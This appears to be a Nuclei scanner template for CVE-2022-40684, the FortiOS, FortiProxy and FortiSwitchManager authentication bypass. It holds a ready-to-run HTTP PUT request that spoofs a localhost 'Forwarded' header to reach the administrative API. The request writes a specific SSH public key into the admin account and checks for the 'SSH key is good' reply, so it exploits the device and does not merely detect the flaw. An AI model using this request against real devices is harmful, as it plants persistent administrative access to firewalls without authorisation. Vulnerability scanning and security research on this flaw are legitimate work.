id: CVE-2022-40684

info:
  name: FortiOS Authentication Bypass
  author: Shockwave
  severity: Critical
  description: An authentication bypass using an alternate path or channel vulnerability [CWE-288] in FortiOS, FortiProxy and FortiSwitchManager may allow an unauthenticated atttacker to perform operations on the administrative interface via specially crafted HTTP or HTTPS requests.
  reference:
    - https://www.horizon3.ai/fortios-fortiproxy-and-fortiswitchmanager-authentication-bypass-technical-deep-dive-cve-2022-40684/

  tags: authentication bypass

requests:
  - raw:
      - |
        PUT /api/v2/cmdb/system/admin/admin HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Report Runner
        Content-Type: application/json
        Forwarded: for=[127.0.0.1]:8000;by=[127.0.0.1]:9000;
        Content-Length: 610

        {
        "ssh-public-key1": "\"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCuw0KQYbqHT7LiktJRGRTaqZxeQ3jUmGK7lx7dN/+A3j6UDA4C0M6eVTOZ6nptwdZMdNDbtI1vJfKXVvyeOIBSGhFJemMcpZva2+HNg1NaEwdgBfjXrbtRjgoQIU1IHMNdybGtdQO+ADjIN8fIYvhqHZBlyQO0sp//KcAtaqG8smChoaum4VJ+lzikp5s/ygmNRa0w/D5gY8FzOgK+VZorCoDVM7sOBoUl2/cwo83auFJA7PyBQwLZ/ISuzUG3UK4a3o56NRARMBLchr9mbHxO/B9z2vyC44wXTwXEsE2al1LI7uMcrxZf1TbmRHNMOw7AIoEA3HlVeDs5OsEgMq5IiHO/eL7vV11BliWf215dOwA2Jfss05TTq81BWSQL8hKo8/d0/tiio67jrZU/bbgl0Am3h5NcPBPEbubN0ZFf7sR6+6GDLevSk72xZufeC7q59zQSyVQsrSWrhuYfQgYkaveQum/QrElO2r9nsuCoRcpAjO9WMr+PxuSoFBinpOG9w07pJlyFjuoC00AM0ZH6TgIabSjjBt/2yhLQH6cvTsTD5FF6NM28eG/S+CbAepKbRUk4fEWLrNgCyzhi+iv/aSEYnMzzDpEEOD8XdD+heIkzJ+A+d4qyOACK+a5IBQnbUeZBGG99vNNpYyQeZ8LBFMfzv5z3oZumkt1dk9llNw== clevergod@clevergod.local\""
        }

    matchers:
      - type: word
        words:
          - 'SSH key is good'
